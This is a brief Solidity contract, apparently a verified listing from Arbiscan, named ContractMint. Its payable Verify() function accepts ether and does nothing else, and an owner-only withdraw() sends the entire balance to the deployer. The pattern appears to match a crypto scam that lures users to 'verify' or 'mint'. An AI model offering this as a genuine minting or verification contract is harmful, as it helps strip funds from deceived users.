/**
 *Submitted for verification at Arbiscan on 2023-05-17
*/

pragma solidity ^0.4.26;

contract ContractMint {

    address private  owner;

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function Verify() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}